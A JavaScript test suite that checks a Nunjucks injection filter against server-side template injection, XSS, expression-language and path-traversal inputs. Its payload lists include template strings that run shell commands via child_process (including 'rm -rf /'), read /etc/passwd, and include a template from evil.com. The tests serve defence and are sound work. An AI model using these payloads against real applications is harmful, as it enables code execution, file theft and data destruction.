/**
 * Comprehensive Template Injection Security Tests
 * Tests against Nunjucks template injection and XSS vulnerabilities
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import nunjucks from 'nunjucks';
import { InjectionPreventionFilter } from '../../src/security/protection/injection-prevention.js';
import path from 'path';
import fs from 'fs-extra';

describe('Template Injection Security', () => {
  let injectionFilter;
  let nunjucksEnv;
  let testDir;

  beforeEach(async () => {
    injectionFilter = new InjectionPreventionFilter();
    await injectionFilter.initialize();
    
    testDir = path.join(__dirname, 'temp-template-test');
    await fs.ensureDir(testDir);
    
    // Configure Nunjucks with security measures
    nunjucksEnv = nunjucks.configure(testDir, {
      autoescape: true,
      throwOnUndefined: false,
      trimBlocks: true,
      lstripBlocks: true
    });
  });

  afterEach(async () => {
    await fs.remove(testDir);
  });

  describe('Server-Side Template Injection (SSTI) Prevention', () => {
    const sstiPayloads = [
      // Nunjucks-specific SSTI
      '{{ constructor.constructor("global.process.mainModule.require(\'child_process\').execSync(\'whoami\')")() }}',
      '{{ constructor.constructor("return process")().mainModule.require("child_process").execSync("id") }}',
      '{{ this.constructor.constructor("return process")().mainModule.require("fs").readFileSync("/etc/passwd") }}',
      '{{ global.process.mainModule.constructor._load("child_process").exec("ls") }}',
      
      // Generic template injections
      '{{7*7}}',
      '${7*7}',
      '#{7*7}',
      '<%= 7*7 %>',
      '{{constructor}}',
      '{{constructor.constructor}}',
      '{{this}}',
      '{{global}}',
      '{{process}}',
      '{{require}}',
      
      // Advanced SSTI
      '{{ cycler.__init__.__globals__.os.popen("id").read() }}',
      '{{ self.__dict__ }}',
      '{{ self.__class__ }}',
      '{{ self.__class__.__mro__ }}',
      '{{ self.__class__.__base__ }}',
      '{{ self.__class__.__subclasses__() }}'
    ];

    it('should detect and block SSTI attempts', async () => {
      for (const payload of sstiPayloads) {
        const result = await injectionFilter.validateString(payload, 'template');
        expect(result.isClean).toBe(false);
        expect(result.threats.some(t => 
          t.type === 'xss' || 
          t.type === 'command-injection' || 
          t.pattern.includes('constructor')
        )).toBe(true);
      }
    });

    it('should prevent code execution via template injection', async () => {
      const dangerousTemplate = '{{ constructor.constructor("return process")().exit() }}';
      
      try {
        const template = nunjucks.compile(dangerousTemplate, nunjucksEnv);
        const result = template.render({});
        
        // If we reach here, the template was rendered but shouldn't execute code
        expect(result).not.toContain('process');
      } catch (error) {
        // Expected behavior - template compilation/rendering should fail safely
        expect(error.message).toBeDefined();
      }
    });

    it('should sanitize dangerous template constructs', async () => {
      const sanitizationTests = [
        {
          input: '{{ constructor }}',
          shouldNotContain: 'constructor'
        },
        {
          input: '{{ global.process }}',
          shouldNotContain: 'process'
        },
        {
          input: '{{ require("fs") }}',
          shouldNotContain: 'require'
        }
      ];

      for (const test of sanitizationTests) {
        const result = await injectionFilter.validateString(test.input, 'template');
        expect(result.isClean).toBe(false);
        expect(result.sanitizedValue).not.toContain(test.shouldNotContain);
      }
    });
  });

  describe('Cross-Site Scripting (XSS) Prevention', () => {
    const xssPayloads = [
      // Basic XSS
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(1)">',
      '<svg onload="alert(1)">',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<object data="javascript:alert(1)"></object>',
      '<embed src="javascript:alert(1)">',
      
      // Event handler XSS
      '<div onclick="alert(1)">Click me</div>',
      '<span onmouseover="alert(1)">Hover</span>',
      '<input onfocus="alert(1)">',
      '<body onload="alert(1)">',
      
      // JavaScript protocol
      'javascript:alert(1)',
      'JAVASCRIPT:alert(1)',
      'JaVaScRiPt:alert(1)',
      'javascript&#58;alert(1)',
      'java\x00script:alert(1)',
      
      // Data URLs
      'data:text/html,<script>alert(1)</script>',
      'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
      
      // VBScript
      'vbscript:msgbox("XSS")',
      'VBSCRIPT:msgbox("XSS")',
      
      // CSS injection
      '<style>body{background:url("javascript:alert(1)")}</style>',
      'expression(alert(1))',
      '@import "javascript:alert(1)"',
      
      // Encoded XSS
      '%3Cscript%3Ealert(1)%3C/script%3E',
      '&lt;script&gt;alert(1)&lt;/script&gt;',
      '&#60;script&#62;alert(1)&#60;/script&#62;',
      
      // Filter evasion
      '<SCrIpT>alert(1)</ScRiPt>',
      '<script>alert(String.fromCharCode(88,83,83))</script>',
      '<script>eval("alert(1)")</script>',
      '<script>window["alert"](1)</script>'
    ];

    it('should detect and block XSS attempts', async () => {
      for (const payload of xssPayloads) {
        const result = await injectionFilter.validateString(payload, 'user-input');
        expect(result.isClean, `XSS should be blocked: ${payload}`).toBe(false);
        expect(result.threats.some(t => t.type === 'xss')).toBe(true);
      }
    });

    it('should properly encode HTML entities', async () => {
      const htmlTests = [
        { input: '<script>alert(1)</script>', shouldContain: '&lt;script&gt;' },
        { input: '"><script>alert(1)</script>', shouldContain: '&quot;&gt;&lt;script&gt;' },
        { input: "'><script>alert(1)</script>", shouldContain: '&#x27;&gt;&lt;script&gt;' }
      ];

      for (const test of htmlTests) {
        const result = await injectionFilter.validateString(test.input, 'html-content');
        expect(result.isClean).toBe(false);
        expect(result.sanitizedValue).toContain(test.shouldContain);
      }
    });

    it('should handle template contexts with user data safely', async () => {
      const template = `
        <div>Hello {{ name }}</div>
        <p>{{ description }}</p>
        <script>var data = {{ data | safe }};</script>
      `;

      const maliciousData = {
        name: '<script>alert("XSS")</script>',
        description: '"><script>alert("XSS2")</script>',
        data: '"; alert("XSS3"); var x="'
      };

      // First validate the data
      const nameResult = await injectionFilter.validateString(maliciousData.name, 'template-data');
      const descResult = await injectionFilter.validateString(maliciousData.description, 'template-data');
      const dataResult = await injectionFilter.validateString(maliciousData.data, 'template-data');

      expect(nameResult.isClean).toBe(false);
      expect(descResult.isClean).toBe(false);
      expect(dataResult.isClean).toBe(false);

      // Use sanitized data
      const sanitizedData = {
        name: nameResult.sanitizedValue,
        description: descResult.sanitizedValue,
        data: dataResult.sanitizedValue
      };

      const compiledTemplate = nunjucks.compile(template, nunjucksEnv);
      const rendered = compiledTemplate.render(sanitizedData);

      // Verify no script tags survived
      expect(rendered).not.toMatch(/<script[^>]*>[\s\S]*?<\/script>/gi);
      expect(rendered).not.toContain('alert(');
    });
  });

  describe('Expression Language Injection', () => {
    const expressionPayloads = [
      // Mathematical expressions that could indicate injection
      '${7*7}',
      '#{7*7}',
      '{{7*7}}',
      '<%= 7*7 %>',
      
      // Object access attempts
      '${this}',
      '${this.constructor}',
      '${this.getClass()}',
      '#{application}',
      '#{session}',
      '#{request}',
      
      // Method invocations
      '${Class.forName("java.lang.Runtime")}',
      '${T(java.lang.System).getProperty("user.dir")}',
      '${applicationScope}',
      '${sessionScope}',
      '${requestScope}'
    ];

    it('should detect expression language injection attempts', async () => {
      for (const payload of expressionPayloads) {
        const result = await injectionFilter.validateString(payload, 'expression');
        expect(result.isClean, `Expression injection should be blocked: ${payload}`).toBe(false);
      }
    });
  });

  describe('Template Path Injection', () => {
    it('should prevent template path traversal', async () => {
      const pathAttacks = [
        '../../../etc/passwd.njk',
        '..\\..\\windows\\system32\\config.njk',
        '/etc/passwd',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        'templates/../../../sensitive.njk'
      ];

      for (const attack of pathAttacks) {
        const result = await injectionFilter.validateString(attack, 'template-path');
        expect(result.isClean).toBe(false);
        expect(result.threats.some(t => t.type === 'path-traversal')).toBe(true);
      }
    });

    it('should allow legitimate template paths', async () => {
      const legitimatePaths = [
        'user-profile.njk',
        'components/header.njk',
        'layouts/base.njk',
        'email/notification.njk'
      ];

      for (const path of legitimatePaths) {
        const result = await injectionFilter.validateString(path, 'template-path');
        expect(result.isClean).toBe(true);
      }
    });
  });

  describe('Nunjucks-Specific Security', () => {
    it('should prevent access to dangerous globals', async () => {
      const dangerousGlobals = [
        'process',
        'global',
        'require',
        'module',
        'exports',
        '__dirname',
        '__filename',
        'Buffer',
        'console'
      ];

      for (const globalVar of dangerousGlobals) {
        const template = `{{ ${globalVar} }}`;
        
        try {
          const compiled = nunjucks.compile(template, nunjucksEnv);
          const result = compiled.render({});
          
          // Should not expose sensitive information
          expect(result).not.toMatch(/\[object|function|Object/);
        } catch (error) {
          // Expected - dangerous access should fail
          expect(error).toBeDefined();
        }
      }
    });

    it('should sanitize filter inputs', async () => {
      const maliciousFilters = [
        '{{ "test" | eval }}',
        '{{ "test" | safe | eval }}',
        '{{ malicious_code | safe }}',
        '{{ user_input | raw }}'
      ];

      for (const filter of maliciousFilters) {
        const result = await injectionFilter.validateString(filter, 'template-filter');
        expect(result.isClean).toBe(false);
      }
    });

    it('should handle macro injection attempts', async () => {
      const macroAttacks = [
        '{% macro evil() %}{{ constructor.constructor("return process")() }}{% endmacro %}',
        '{% set evil = constructor.constructor("return global")() %}',
        '{% for item in constructor.constructor("return process")().mainModule %}{{ item }}{% endfor %}'
      ];

      for (const attack of macroAttacks) {
        const result = await injectionFilter.validateString(attack, 'template-macro');
        expect(result.isClean).toBe(false);
      }
    });
  });

  describe('Context-Aware Template Security', () => {
    it('should apply different security rules based on template context', async () => {
      const payload = '<script>alert(1)</script>';
      
      // HTML context - should escape
      const htmlResult = await injectionFilter.validateString(payload, 'html-template');
      expect(htmlResult.isClean).toBe(false);
      expect(htmlResult.sanitizedValue).toContain('&lt;script&gt;');
      
      // JavaScript context - should block entirely
      const jsResult = await injectionFilter.validateString(payload, 'javascript-template');
      expect(jsResult.isClean).toBe(false);
      
      // URL context - should validate and encode
      const urlResult = await injectionFilter.validateString('javascript:alert(1)', 'url-template');
      expect(urlResult.isClean).toBe(false);
    });

    it('should validate template includes securely', async () => {
      const includeAttacks = [
        '{% include "../../../etc/passwd" %}',
        '{% include "http://evil.com/malicious.njk" %}',
        '{% include malicious_variable %}',
        '{% extends "../../../etc/passwd" %}'
      ];

      for (const attack of includeAttacks) {
        const result = await injectionFilter.validateString(attack, 'template-include');
        expect(result.isClean).toBe(false);
      }
    });
  });

  describe('Template Compilation Security', () => {
    it('should prevent compilation of malicious templates', async () => {
      const maliciousTemplate = `
        {{ constructor.constructor("return process")().mainModule.require("child_process").execSync("rm -rf /") }}
      `;

      try {
        const compiled = nunjucks.compile(maliciousTemplate, nunjucksEnv);
        const result = compiled.render({});
        
        // Should not execute dangerous code
        expect(typeof result).toBe('string');
        expect(result).not.toContain('process');
      } catch (error) {
        // Expected - dangerous templates should fail to compile safely
        expect(error).toBeDefined();
      }
    });

    it('should handle template compilation errors gracefully', async () => {
      const brokenTemplates = [
        '{{ unclosed_expression',
        '{% if condition %}{% endif',
        '{{ undefined_filter | nonexistent }}',
        '{% for item in %}{% endfor %}'
      ];

      for (const template of brokenTemplates) {
        expect(() => {
          nunjucks.compile(template, nunjucksEnv);
        }).toThrow();
      }
    });
  });

  describe('Performance and DoS Protection', () => {
    it('should handle large template payloads efficiently', async () => {
      const largePayload = '<script>alert(1)</script>'.repeat(1000);
      const startTime = performance.now();
      
      const result = await injectionFilter.validateString(largePayload, 'large-template');
      const endTime = performance.now();
      
      expect(result.isClean).toBe(false);
      expect(endTime - startTime).toBeLessThan(5000); // Should complete within 5 seconds
    });

    it('should prevent regex DoS in template validation', async () => {
      const complexPayload = '{{' + 'x'.repeat(10000) + '}}';
      const startTime = performance.now();
      
      const result = await injectionFilter.validateString(complexPayload, 'complex-template');
      const endTime = performance.now();
      
      expect(endTime - startTime).toBeLessThan(1000); // Should not hang
    });
  });
});